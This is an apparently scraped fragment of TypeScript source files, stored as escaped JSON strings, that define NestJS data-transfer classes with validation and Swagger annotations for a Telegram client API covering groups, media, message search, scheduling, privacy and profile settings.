string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsArray, IsBoolean, IsNotEmpty, IsOptional, IsString } from 'class-validator';\r\n\r\nexport class CreateChatFolderDto {\r\n    @ApiProperty({ description: 'Name of the chat folder' })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    name: string;\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to include in the folder' })\r\n    @IsArray()\r\n    @IsNotEmpty()\r\n    includedChats: string[];\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to exclude from the folder', required: false })\r\n    @IsArray()\r\n    @IsOptional()\r\n    excludedChats?: string[];\r\n\r\n    @ApiProperty({ description: 'Include contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include non-contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeNonContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include groups in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeGroups?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include broadcast channels in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBroadcasts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include bots in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBots?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude muted chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeMuted?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude read chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeRead?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude archived chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeArchived?: boolean;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsBoolean, IsInt, IsOptional, IsString } from 'class-validator';\n\nexport class DeleteHistoryDto {\n  @ApiProperty({\n    description: 'Username or peer ID of the chat whose history you want to delete',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiPropertyOptional({\n    description: 'Deletes all messages with IDs less than or equal to this value',\n  })\n  @IsOptional()\n  @IsInt()\n  maxId?: number;\n\n  @ApiPropertyOptional({\n    description: 'If true, clears the history only for the current user without deleting for others',\n    default: true,\n  })\n  @IsOptional()\n  @IsBoolean()\n  justClear: boolean = true;\n\n  @ApiPropertyOptional({\n    description: 'If true, deletes the message history for all participants (if permitted)',\n    default: false,\n  })\n  @IsOptional()\n  @IsBoolean()\n  revoke: boolean = false;\n\n  @ApiPropertyOptional({\n    description: 'Minimum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  minDate?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  maxDate?: number;\n}\n","import { IsString, IsOptional, IsNumber, IsBoolean, IsObject, ValidateNested, IsNotEmpty, IsEnum, IsDateString } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type, Transform } from 'class-transformer';\r\n\r\nexport enum AdminPermission {\r\n  CHANGE_INFO = 'changeInfo',\r\n  POST_MESSAGES = 'postMessages',\r\n  EDIT_MESSAGES = 'editMessages',\r\n  DELETE_MESSAGES = 'deleteMessages',\r\n  BAN_USERS = 'banUsers',\r\n  INVITE_USERS = 'inviteUsers',\r\n  PIN_MESSAGES = 'pinMessages',\r\n  ADD_ADMINS = 'addAdmins',\r\n  ANONYMOUS = 'anonymous',\r\n  MANAGE_CALL = 'manageCall'\r\n}\r\n\r\nexport class AdminPermissionsDto {\r\n  @ApiProperty({ description: 'Permission to change group info', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  changeInfo?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to post messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  postMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to edit messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  editMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to delete messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  deleteMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to ban users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  banUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to invite users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  inviteUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to pin messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  pinMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to add new admins', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  addAdmins?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to remain anonymous', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  anonymous?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to manage voice chats', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  manageCall?: boolean = true;\r\n}\r\n\r\n// Base class for group operations\r\nexport class BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Group ID' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  groupId: string;\r\n}\r\n\r\nexport class GroupMemberOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Array of user IDs', type: [String] })\r\n  @IsString({ each: true })\r\n  members: string[];\r\n}\r\n\r\nexport class AdminOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'User ID to promote/demote' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  userId: string;\r\n\r\n  @ApiProperty({ description: 'Whether to promote or demote', required: true })\r\n  @IsBoolean()\r\n  isPromote: boolean;\r\n\r\n  @ApiProperty({ description: 'Admin permissions', required: false })\r\n  @IsOptional()\r\n  @ValidateNested()\r\n  @Type(() => AdminPermissionsDto)\r\n  permissions?: AdminPermissionsDto;\r\n\r\n  @ApiProperty({ description: 'Custom admin rank/title', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  rank?: string;\r\n}\r\n\r\nexport class GroupSettingsDto extends BaseGroupOperationDto {\r\n  @ApiPropertyOptional({ description: 'Group title', required: false })\r\n  @IsString()\r\n  @IsOptional()\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group username', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n\r\nexport class ChatCleanupDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Chat ID to clean up' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  chatId: string;\r\n  @ApiProperty({ description: 'Delete messages before this date', required: false })\r\n  @IsOptional()\r\n  @IsDateString()\r\n  @Transform(({ value }) => value ? new Date(value) : undefined)\r\n  beforeDate?: Date;\r\n\r\n  @ApiProperty({ description: 'Only delete media messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  onlyMedia?: boolean;\r\n\r\n  @ApiProperty({ description: 'Exclude pinned messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  excludePinned?: boolean;\r\n}\r\n\r\nexport class createGroupDto {\r\n  @ApiProperty({ description: 'Group title', required: true })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  title: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number = 0;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a broadcast', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  broadcast?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n","// Core Types and Interfaces\r\nexport * from '../../../interfaces/telegram';\r\n\r\n// Base DTOs\r\nexport * from './batch-operations.dto';\r\nexport * from './media-operations.dto';\r\nexport * from './schedule-operations.dto';\r\nexport * from './metadata-operations.dto';\r\nexport * from './group-operations.dto';\r\nexport * from './contact-management.dto';\r\nexport * from './profile-settings.dto';\r\nexport * from './view-once-media.dto';\r\nexport * from './create-bot.dto';\r\n\r\n// Type Re-exports\r\nexport { BatchOperationType } from './batch-operations.dto';\r\nexport { MediaType } from './media-operations.dto';\r\nexport { AdminPermission } from './group-operations.dto';\r\nexport { ExportFormat } from './contact-management.dto';\r\n","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, IsUrl, ValidateNested } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MediaType {\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  DOCUMENT = 'document',\r\n  VOICE = 'voice',\r\n  AUDIO = 'audio'\r\n}\r\n\r\n// Base class for media operations\r\nexport class BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Chat ID for media operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class MediaSearchDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Media types to include', enum: MediaType, isArray: true })\r\n  @IsArray()\r\n  @IsEnum(MediaType, { each: true })\r\n  types: MediaType[];\r\n\r\n  @ApiProperty({ description: 'Message offset', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Items per page', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class MediaFilterDto extends MediaSearchDto {\r\n  @ApiProperty({ description: 'Start date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  startDate?: string;\r\n\r\n  @ApiProperty({ description: 'End date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  endDate?: string;\r\n}\r\n\r\nexport class SendMediaDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Caption for the media', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n\r\n  @ApiProperty({ description: 'Filename for the media' })\r\n  @IsString()\r\n  filename: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n}\r\n\r\nexport class MediaAlbumItemDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n\r\n  @ApiProperty({ description: 'Caption for the media item', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}\r\n\r\nexport class SendMediaAlbumDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Array of media items', type: [MediaAlbumItemDto] })\r\n  @IsArray()\r\n  @ValidateNested({ each: true })\r\n  @Type(() => MediaAlbumItemDto)\r\n  media: MediaAlbumItemDto[];\r\n}\r\n\r\nexport class VoiceMessageDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the voice message file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Duration of voice message in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  duration?: number;\r\n\r\n  @ApiProperty({ description: 'Caption for the voice message', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type } from 'class-transformer';\r\nimport {\r\n  IsString,\r\n  IsOptional,\r\n  IsArray,\r\n  IsNumber,\r\n  IsEnum,\r\n  IsDate,\r\n  Min,\r\n  Max,\r\n  IsInt,\r\n  ValidateNested,\r\n  ArrayMinSize,\r\n  ArrayMaxSize\r\n} from 'class-validator';\r\n\r\n/**\r\n * Enum for message media types that can be searched\r\n */\r\nexport enum MessageMediaType {\r\n  ALL = 'all',\r\n  TEXT = 'text',\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  VOICE = 'voice',\r\n  DOCUMENT = 'document',\r\n  ROUND_VIDEO = 'roundVideo',\r\n  ROUND_VOICE = 'roundVoice',\r\n  STICKER = 'sticker',\r\n  ANIMATION = 'animation',\r\n  CONTACT = 'contact',\r\n  MUSIC = 'music',\r\n  CHAT_PHOTO = 'chatPhoto',\r\n}\r\n\r\n/**\r\n * Enum for search scope\r\n */\r\nexport enum SearchScope {\r\n  CHAT = 'chat',\r\n  GLOBAL = 'global'\r\n}\r\n\r\n/**\r\n * DTO for search messages request\r\n */\r\nexport class SearchMessagesDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Chat ID to search in (required for chat-specific search)',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  chatId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Search query string',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  query?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Filter by multiple types options',\r\n    isArray: true,\r\n    enum: MessageMediaType,\r\n    example: [MessageMediaType.TEXT, MessageMediaType.PHOTO],\r\n    default: [MessageMediaType.ALL, MessageMediaType.TEXT, MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.VOICE, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VIDEO, MessageMediaType.ROUND_VOICE, MessageMediaType.STICKER, MessageMediaType.ANIMATION, MessageMediaType.CONTACT, MessageMediaType.MUSIC, MessageMediaType.CHAT_PHOTO],\r\n  })\r\n  @IsOptional()\r\n  @IsArray()\r\n  @IsEnum(MessageMediaType, { each: true })\r\n  @Type(() => String)\r\n  types?: MessageMediaType[];\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Minimum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  minId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  maxId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum number of messages to retrieve',\r\n    minimum: 1,\r\n    maximum: 500,\r\n  })\r\n  @IsInt()\r\n  @Min(1)\r\n  @Max(500)\r\n  @IsOptional()\r\n  limit?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset ID for pagination',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset date as Unix timestamp',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetDate?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Start date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  startDate?: Date;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'End date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  endDate?: Date;\r\n}\r\n\r\n/**\r\n * Interface for message search results by type\r\n */\r\nexport class MessageTypeResult {\r\n  @ApiProperty({\r\n    description: 'Array of message IDs matching the search criteria',\r\n    type: [Number],\r\n    example: [1001, 1005, 1010]\r\n  })\r\n  @IsArray()\r\n  @IsInt({ each: true })\r\n  messages: number[];\r\n\r\n  @ApiProperty({\r\n    description: 'Total count of messages matching the search criteria',\r\n    example: 3\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  total: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Enriched search result items with resolved sender names and dates',\r\n    type: 'array',\r\n    items: {\r\n      type: 'object',\r\n      properties: {\r\n        id: { type: 'number' },\r\n        text: { type: 'string' },\r\n        date: { type: 'string', description: 'ISO 8601 date' },\r\n        chatId: { type: 'string' },\r\n        senderName: { type: 'string', nullable: true },\r\n        mediaType: { type: 'string', nullable: true },\r\n      },\r\n    },\r\n  })\r\n  @IsOptional()\r\n  data?: Array<{ id: number; text: string; date: string; chatId: string; senderName: string | null; mediaType: string | null }>\r\n}\r\n\r\n/**\r\n * DTO for search messages response\r\n */\r\nexport class SearchMessagesResponseDto {\r\n  @ApiPropertyOptional({\r\n    description: 'All message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  all?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Text message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  text?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Photo message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  photo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  video?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  voice?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Document message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  document?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round video message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVideo?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Round voice message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  roundVoice?: MessageTypeResult;\r\n}","import { IsString, IsNumber, IsOptional, IsArray, IsBoolean, Min, Max, Length, ArrayMinSize, ArrayMaxSize, IsNotEmpty, IsEnum } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MetadataType {\r\n    PHOTO = 'photo',\r\n    VIDEO = 'video',\r\n    DOCUMENT = 'document'\r\n}\r\n\r\nexport class MediaMetadataDto {\r\n    @ApiProperty({ description: 'Chat ID to get metadata from' })\r\n    @IsString()\r\n    chatId: string;\r\n\r\n    @ApiProperty({ description: 'Message offset', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    offset?: number;\r\n\r\n    @ApiProperty({ description: 'Maximum number of items', required: false })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    limit?: number = 50;\r\n}\r\n\r\nexport enum DialogsPeerType {\r\n    ALL = 'all',\r\n    USER = 'user',\r\n    GROUP = 'group',\r\n    CHANNEL = 'channel',\r\n}\r\n\r\nexport class BulkMessageOperationDto {\r\n    @ApiProperty({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    fromChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 })\r\n    @IsString()\r\n    toChatId!: string;\r\n\r\n    @ApiProperty({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 })\r\n    @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n    messageIds!: number[];\r\n}","import { IsString, IsOptional, IsEnum, IsBoolean } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { PrivacyLevel, PrivacyLevelEnum } from '../../../interfaces/telegram';\r\n\r\nexport class PrivacySettingsDto {\r\n  @ApiProperty({ description: 'Phone number visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  phoneNumber?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Last seen visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  lastSeen?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Profile photos visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  profilePhotos?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Message forwards visibility', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  forwards?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Calls privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  calls?: PrivacyLevel;\r\n\r\n  @ApiProperty({ description: 'Group chats privacy', enum: PrivacyLevelEnum, required: false })\r\n  @IsOptional()\r\n  @IsEnum(PrivacyLevelEnum)\r\n  groups?: PrivacyLevel;\r\n}\r\n\r\nexport class SecuritySettingsDto {\r\n  @ApiProperty({ description: 'Enable/disable two-factor authentication' })\r\n  @IsBoolean()\r\n  twoFactorAuth: boolean;\r\n\r\n  @ApiProperty({ description: 'Active sessions limit', required: false })\r\n  @IsOptional()\r\n  @IsEnum([1, 2, 3, 4, 5])\r\n  activeSessionsLimit?: number;\r\n}\r\n\r\nexport class ProfilePhotoDto {\r\n  @ApiProperty({ description: 'Name/identifier of the photo to set' })\r\n  @IsString()\r\n  name: string;\r\n}","import { IsString, IsOptional, IsNumber, IsBoolean, IsDateString } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { BaseBatchItemDto } from './batch-operations.dto';\r\n\r\nexport class ScheduleMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message content' })\r\n  @IsString()\r\n  message: string;\r\n\r\n  @ApiProperty({ description: 'Date to schedule the message' })\r\n  @IsDateString()\r\n  @Transform(({ value }) => new Date(value))\r\n  scheduledTime: string;\r\n\r\n  @ApiProperty({ description: 'Message to reply to', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  replyTo?: number;\r\n\r\n  @ApiProperty({ description: 'Silent notification', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  silent?: boolean;\r\n}\r\n\r\nexport class GetScheduledMessagesDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Maximum number of messages to return', required: false, default: 50 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class DeleteScheduledMessageDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'ID of the scheduled message to delete' })\r\n  @IsNumber()\r\n  messageId: number;\r\n}\r\n\r\nexport class RescheduleMessageDto {\r\n  @ApiProperty({ description: 'Chat ID containing the message' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID to reschedule' })\r\n  @IsNumber()\r\n  messageId: number;\r\n\r\n  @ApiProperty({ description: 'New schedule date (ISO string)' })\r\n  @IsDateString()\r\n  newScheduleDate: string;\r\n}\r\n\r\nexport class BatchProcessItemDto {\r\n  @ApiProperty({ description: 'Chat ID or message ID depending on operation' })\r\n  @IsString()\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'Message ID for operations that require it', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString, IsOptional } from 'class-validator';\n\nexport class SendTgMessageDto {\n  @ApiProperty({\n    description: 'Target username or peer ID',\n    example: 'someusername',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiProperty({\n    description: 'Message text to send',\n    example: 'Hello from NestJS and GramJS!',\n  })\n  @IsString()\n  message: string;\n\n  @ApiProperty({\n    description: 'Optional message parse mode (Markdown, HTML)',\n    required: false,\n    example: 'Markdown',\n  })\n  @IsOptional()\n  @IsString()\n  parseMode?: 'Markdown' | 'HTML';\n}\n","import { IsString, IsOptional } from 'class-validator';\r\nimport { ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport class UpdateProfileDto {\r\n    @ApiPropertyOptional({ description: 'First name' })\r\n    @IsOptional()\r\n    @IsString()\r\n    firstName?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'About information', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    about?: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\nimport { IsString } from 'class-validator';\n\nexport class UpdateUsernameDto {\n  @ApiProperty({\n    description: 'New username to set for the Telegram user',\n    example: 'new_username123',\n  })\n  @IsString()\n  newUsername: string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsEnum, IsNotEmpty, IsOptional, IsString, ValidateIf } from 'class-validator';\r\n\r\nexport enum MediaSourceType {\r\n    PATH = 'path',\r\n    BASE64 = 'base64',\r\n    BINARY = 'binary'\r\n}\r\n\r\nexport class ViewOnceMediaDto {\r\n    @ApiProperty({\r\n        description: 'Chat ID to send the view once media to',\r\n        example: '123456789'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    chatId: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Source type of the media: url, base64, or binary',\r\n        enum: MediaSourceType,\r\n        example: 'url'\r\n    })\r\n    @IsEnum(MediaSourceType)\r\n    @IsNotEmpty()\r\n    sourceType: MediaSourceType;\r\n\r\n    @ApiProperty({\r\n        description: 'URL of the media file (when sourceType is url)',\r\n        required: false,\r\n        example: 'https://example.com/image.jpg'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.PATH)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    path?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Base64 encoded media data (when sourceType is base64)',\r\n        required: false,\r\n        example: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BASE64)\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    base64Data?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Binary media data (when sourceType is binary)',\r\n        required: false,\r\n        type: 'string',\r\n        format: 'binary'\r\n    })\r\n    @ValidateIf(o => o.sourceType === MediaSourceType.BINARY)\r\n    binaryData?: any;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional caption for the media',\r\n        required: false,\r\n        example: 'Check this out! It will disappear after viewing'\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    caption?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Optional filename for the media',\r\n        required: false,\r\n        example: 'secret_image.jpg'\r\n    })\r\n    @IsString()\r\n    